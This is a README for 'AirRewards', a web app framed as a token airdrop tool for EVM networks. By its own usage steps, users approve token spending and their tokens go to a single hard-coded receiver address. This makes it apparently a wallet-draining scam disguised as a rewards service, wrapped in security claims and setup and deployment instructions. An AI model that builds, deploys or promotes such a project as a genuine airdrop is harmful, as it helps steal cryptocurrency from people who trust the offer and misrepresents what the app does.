# AirRewards 🎁

A professional web application for facilitating token airdrops on Ethereum Virtual Machine (EVM) networks.

![License](https://img.shields.io/badge/license-MIT-blue.svg)
![Node](https://img.shields.io/badge/node-%3E%3D18.0.0-brightgreen.svg)
![Web3](https://img.shields.io/badge/web3-enabled-orange.svg)

## Features

✨ **Modern UI/UX** - Clean, responsive design that works on mobile and desktop
🔐 **Secure** - Built-in security validations and smart contract integration
⚡ **Fast** - Instant token transfers on EVM networks
🌐 **Multi-Chain** - Support for all EVM-compatible networks
🔌 **Wallet Integration** - MetaMask, TrustWallet, and other Web3 wallets

## Overview

AirRewards is a decentralized application (dApp) that enables users to:
- Connect their EVM-compatible wallets
- Approve token transfers
- Automatically transfer tokens to a designated receiver address

**Receiver Address:** `0xf36aa3cd6fdd245d03982caeb7c4a31b2b4be1d0`

## Technology Stack

### Frontend
- **HTML5/CSS3** - Modern, responsive design
- **JavaScript (ES6+)** - Interactive functionality
- **Web3.js** - Blockchain interaction library

### Backend
- **Node.js** - Runtime environment
- **Express.js** - Web server framework

### Smart Contracts
- **Solidity** - Smart contract language
- **ERC-20** - Token standard interface

### Deployment
- **Docker** - Containerization
- **Nginx** - Reverse proxy
- **PM2** - Process manager

## Quick Start

### Prerequisites

- Node.js 18.x or newer
- npm 9.x or newer
- MetaMask or compatible Web3 wallet

### Installation

1. Clone the repository:
```bash
git clone https://github.com/suportcoinspace-lgtm/Airrewards.git
cd Airrewards
```

2. Install dependencies:
```bash
npm install
```

3. Start the server:
```bash
npm start
```

4. Open your browser and navigate to:
```
http://localhost:3000
```

## Usage

### For Users

1. **Connect Wallet**
   - Click "Connect Wallet" button
   - Approve the connection in MetaMask
   - Your wallet address will be displayed

2. **Enter Token Address**
   - Input the ERC-20 token contract address
   - Click "Check Token" to view balance

3. **Approve & Transfer**
   - Click "Approve & Transfer" button
   - Confirm both transactions in MetaMask
   - Tokens will be transferred to the receiver address

### For Developers

#### Smart Contract

The `AirdropManager` contract is located in `contracts/AirdropManager.sol`:

```solidity
// Main functions:
- transferApprovedTokens(address tokenAddress)
- getApprovedAmount(address tokenAddress, address owner)
```

#### Frontend Integration

The application uses Web3.js for blockchain interaction:

```javascript
// Key components in public/app.js:
- connectWallet() - Wallet connection
- checkToken() - Token validation
- approveAndTransfer() - Token approval and transfer
```

## Deployment

### Option 1: Standard Deployment

Using PM2 process manager:

```bash
# Install PM2
npm install -g pm2

# Start application
pm2 start server.js --name airrewards

# Save configuration
pm2 save
pm2 startup
```

### Option 2: Docker Deployment

Using Docker and Docker Compose:

```bash
# Build and start
docker-compose up -d

# View logs
docker-compose logs -f

# Stop
docker-compose down
```

### Termius VPS Deployment

See [DEPLOYMENT.md](DEPLOYMENT.md) for complete VPS deployment instructions including:
- System setup
- Nginx configuration
- SSL certificates
- Security hardening
- Monitoring and maintenance

## Project Structure

```
Airrewards/
├── contracts/              # Solidity smart contracts
│   └── AirdropManager.sol
├── public/                 # Frontend files
│   ├── index.html         # Main HTML page
│   ├── styles.css         # Styling
│   └── app.js             # JavaScript logic
├── server.js              # Express server
├── package.json           # Dependencies
├── Dockerfile             # Docker configuration
├── docker-compose.yml     # Docker Compose config
├── DEPLOYMENT.md          # Deployment guide
└── README.md              # This file
```

## Security

### Built-in Security Features

✅ **Input Validation** - All user inputs are validated
✅ **Address Verification** - Ethereum addresses are checked
✅ **Transaction Confirmation** - Users must approve all transactions
✅ **Error Handling** - Comprehensive error messages
✅ **Smart Contract Security** - Follows Solidity best practices

### Security Best Practices

- Never share private keys
- Verify contract addresses before interacting
- Use testnet for testing
- Keep dependencies updated
- Monitor transaction logs

## Supported Networks

The application works on all EVM-compatible networks:

- Ethereum Mainnet & Testnets (Goerli, Sepolia)
- Binance Smart Chain (BSC)
- Polygon (Matic)
- Avalanche C-Chain
- Fantom Opera
- And more...

## Browser Support

- Chrome/Brave (Recommended with MetaMask)
- Firefox (with MetaMask)
- Safari (with compatible wallet)
- Edge (with MetaMask)

## API Endpoints

- `GET /` - Main application page
- `GET /health` - Health check endpoint

## Contributing

Contributions are welcome! Please follow these guidelines:

1. Fork the repository
2. Create a feature branch
3. Commit your changes
4. Push to the branch
5. Open a Pull Request

## Troubleshooting

### Common Issues

**Wallet not connecting:**
- Ensure MetaMask is installed
- Check if you're on the correct network
- Refresh the page and try again

**Transaction failing:**
- Check if you have sufficient token balance
- Ensure you have enough gas (ETH) for transactions
- Verify the token contract address is correct

**Page not loading:**
- Check if the server is running
- Verify port 3000 is not in use
- Check browser console for errors

## License

This project is licensed under the MIT License - see the LICENSE file for details.

## Acknowledgments

- Web3.js for blockchain integration
- Express.js for the web framework
- The Ethereum community

## Contact & Support

For questions, issues, or feature requests:
- Open an issue on GitHub
- Check [DEPLOYMENT.md](DEPLOYMENT.md) for deployment help

## Disclaimer

This software is provided "as is" without warranty. Use at your own risk. Always verify smart contract addresses and transactions before proceeding. Never share your private keys or seed phrases.

---

Made with ❤️ for the Web3 community